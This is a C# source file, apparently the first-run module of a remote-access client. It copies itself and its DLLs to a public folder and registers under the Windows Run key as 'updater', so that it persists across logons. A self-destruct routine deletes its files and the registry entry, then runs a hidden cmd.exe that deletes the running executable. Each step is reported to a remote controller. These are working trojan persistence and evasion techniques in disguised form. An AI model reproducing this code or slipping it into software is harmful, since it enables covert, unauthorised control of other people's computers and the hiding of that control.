using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using ZedstronRemoteClient;

namespace RemoteClient
{
    class FirstRun
    {
        private bool report;
        private string rpath;
        String fileName;

        public FirstRun(bool flag)
        {
            report = flag;
            rpath = "C:\\Users\\Public\\updater\\";
            fileName = String.Concat(Process.GetCurrentProcess().ProcessName, ".exe");
        }

        public void SelfTest()
        {
            if (!File.Exists(rpath+ fileName))
            {
                SendReport("Remote Client is not In Safe Place Preparing to Make it Safe!");
                CopyData();
            }
            else
                SendReport("Remote Client is Safe but External libraries are not tested!");
        }

        public void SelfDestruct()
        {
            try
            {
                string[] files = Directory.GetFiles(rpath);
                foreach (string file in files)
                {
                    FileInfo info = new FileInfo(file);
                    if (info.Name != fileName)
                    {
                        SendReport("Deleting " + info.Name + "");
                        if (File.Exists(info.FullName))
                            File.Delete(info.FullName);

                        if (File.Exists(info.FullName))
                            SendReport("Deletion Failed!");
                        else
                            SendReport("Deletion Success!");
                    }
                    else
                        SendReport("Putting Myself in Que!");
                }

                SendReport("Attempting to Clear Registery!");
                RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                if (registryKey.GetValue("updater") != null)
                    registryKey.DeleteValue("updater");
                else
                    SendReport("Already Cleared!");

                if (registryKey.GetValue("updater") == null)
                    SendReport("Registery Cleared Successfully!");
                else
                    SendReport("Oh Shit! cant modify registery now");


                SendReport("Launching My Killer now for Clean & Sweep . . . . . We have a Great time together Good Bye!");
                LaunchKiller();
            }
            catch(Exception e)
            {
                SendReport(e.ToString());
            }
        }

        private void LaunchKiller()
        {
            ProcessStartInfo Info = new ProcessStartInfo();
            Info.Arguments = "choice /C Y /N /D Y /T 5 & Del \"" + Application.ExecutablePath + "\"";
            Info.WindowStyle = ProcessWindowStyle.Hidden;
            Info.CreateNoWindow = true;
            Info.FileName = "cmd.exe";
            Process.Start(Info); 
        }

        private void CopyData()
        {
            try
            {
                if (!Directory.Exists(rpath))
                    Directory.CreateDirectory(rpath);

                string[] dlls = Directory.GetFiles(Environment.CurrentDirectory);
                
                String filePath = Path.Combine(Environment.CurrentDirectory, fileName);

                foreach (string dll in dlls)
                {
                    FileInfo info = new FileInfo(dll);
                    if (info.Extension == ".dll")
                    {
                        if (!File.Exists(rpath + info.Name))
                        {
                            SendReport(info.Name + " . . . . . . . . . . . . . [Not Exists]");
                            File.Copy(dll, rpath + info.Name, true);

                            if (!File.Exists(rpath + info.Name))
                                SendReport("Copy Operation Failed!");
                            else
                                SendReport("Copy Operation Succeed!");
                        }
                        else
                            SendReport(info.Name + " . . . . . . . . . . . . . [PASSED]");
                    }
                }

                File.Copy(filePath, rpath + fileName);

                if (!File.Exists(rpath + fileName))
                    SendReport("Cannot copy Remote Client in Safe Place!");
                else
                    SendReport("Hurrah! Operation Fail Safe has been Completed with Success!");

                RegisterInStartup(rpath + fileName);
            }
            catch (Exception e)
            {
                SendReport(e.ToString());
            }
        }

        private void RegisterInStartup(string path)
        {
            try
            {
                RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                if (registryKey.GetValue("updater") == null)
                {
                    registryKey.SetValue("updater", path);
                    SendReport("Registery not Exists Trying to Create an valid Startup!");
                }
                else
                    SendReport("Rigistery Already Created!");

                if (registryKey.GetValue("updater") == null)
                    SendReport("Registeration Failed!");
                else
                    SendReport("Registration Successfull!");
            }
            catch (Exception e)
            {
                SendReport(e.ToString());
            }
        }

        public string Status()
        {
            try
            {
                string res = "";
                RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

                if (registryKey.GetValue("updater") != null)
                    res = "Registery key Existance Test Passed!" + Environment.NewLine;
                else
                    res = "Registery Key Existance Test Failed!" + Environment.NewLine;

                if (File.Exists(Environment.SpecialFolder.System + "\\localhost.exe"))
                    res += "Remote Client is in Safe Place!"+Environment.NewLine;
                else
                    res += "Remote Client is Not in Safe Place!"+Environment.NewLine;

                if (UAC.IsAdmin())
                    res += "Remote Client is Running under Admin Mode!" + Environment.NewLine;
                else
                    res += "Remote Client has no Priviliges!" + Environment.NewLine;

                res += "Execution Path is '" + Environment.CurrentDirectory + "'";

                return res;
            }
            catch
            {
                return "Cannot Get Status!";
            }
        }

        private void SendReport(string rep)
        {
            if (report)
            {
                RemoteClient.SendMessage(new global::DataObject
                {
                    CommandType = "Self",
                    CommandName = "result",
                    CommandData = rep
                });
            }
        }
    }
}
